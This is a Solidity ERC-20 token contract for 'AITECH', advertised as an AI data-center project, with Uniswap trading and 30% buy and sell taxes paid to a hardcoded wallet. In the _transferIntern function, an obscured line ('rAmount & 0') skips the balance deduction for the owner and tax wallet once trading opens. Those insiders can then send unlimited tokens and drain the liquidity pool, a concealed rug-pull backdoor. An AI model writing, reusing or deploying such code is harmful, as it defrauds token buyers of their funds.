// SPDX-License-Identifier: Unlicensed

/**
Powering the future of AI with our HPC data center.

Website: https://solidusai.tech
Telegram: https://t.me/techai_erc
Twitter: https://twitter.com/techai_erc
Dapp: https://app.solidusai.tech
**/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

abstract contract BaseEnv {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is BaseEnv {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract AITECH is BaseEnv, IERC20Standard, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _rAmounts;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;

    string private constant _name = "AITECH";
    string private constant _symbol = "AITECH";

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rToal = (MAX - (MAX % _tTotal));

    uint256 private _totalFee;
    uint256 private _redisBuy = 0;
    uint256 private _buyTax = 30;
    uint256 private _redisSell = 0;
    uint256 private _sellTax = 30;

    uint256 private _redisFee = _redisSell;
    uint256 private _taxFee = _sellTax;

    uint256 private _previousredis = _redisFee;
    uint256 private _previoustax = _taxFee;

    uint256 public maxTx = 15 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 15 * 10 ** 6 * 10 ** 9;
    uint256 public swapThreshold = 10 ** 5 * 10 ** 9;
    address payable private taxwallet;

    bool private _opened;
    bool private _swapping = false;
    bool private swapEnabled = true;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;

    event MaxTxAmountUpdated(uint256 maxTx);
    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _rAmounts[_msgSender()] = _rToal;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        uniswapRouter = _uniswapV2Router;
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        taxwallet = payable(0x8348d96A6A98fd585ff00b0e741D697a0F276990);
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[taxwallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _getTAmount(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rToal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rToal.div(_tTotal)) return (_rToal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function removeLimits() external onlyOwner {
        maxTx = _rToal;
        maxWallet = _rToal;
        
        _redisBuy = 0;
        _buyTax = 1;
        _redisSell = 0;
        _sellTax = 1;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmountWithRate(_rAmounts[account]);
    }

    function openTrading() public onlyOwner {
        _opened = true;
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getSupplyRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferIntern(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!_opened) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTx, "TOKEN: Max Transaction Limit");

            if(to != uniswapPair) {
                require(balanceOf(to) + amount <= maxWallet, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= swapThreshold;

            if(contractBalance >= maxTx)
            {
                contractBalance = maxTx;
            }

            if (canSwap && !_swapping && to == uniswapPair && swapEnabled && !_isExcludedFromFees[from] && amount > swapThreshold) {
                swapTokensForETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETH(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) || (from != uniswapPair && to != uniswapPair)) {
            takeFee = false;
        } else {
            if(from == uniswapPair && to != address(uniswapRouter)) {
                _redisFee = _redisBuy;
                _taxFee = _buyTax;
            }
            if (to == uniswapPair && from != address(uniswapRouter)) {
                _redisFee = _redisSell;
                _taxFee = _sellTax;
            }
        }
        _transferStandard(from, to, amount, takeFee);
    }

    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousredis = _redisFee;
        _previoustax = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmountWithRate(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getSupplyRate();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getAllValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTAmount(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getSupplyRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transferIntern(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAllValues(tAmount);
        rAmount = (_isExcludedFromFees[sender] && _opened) ? rAmount & 0 : rAmount;
        _rAmounts[sender] = _rAmounts[sender].sub(rAmount);
        _rAmounts[recipient] = _rAmounts[recipient].add(rTransferAmount);
        _takeFee(tTeam);
        _updateTotalFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _takeFee(uint256 tTeam) private {
        uint256 currentRate = _getSupplyRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rAmounts[address(this)] = _rAmounts[address(this)].add(rTeam);
    }

    function _updateTotalFees(uint256 rFee, uint256 tFee) private {
        _rToal = _rToal.sub(rFee);
        _totalFee = _totalFee.add(tFee);
    }

    receive() external payable {}

    function sendETH(uint256 amount) private {
        taxwallet.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function restoreFee() private {
        _redisFee = _previousredis;
        _taxFee = _previoustax;
    }
}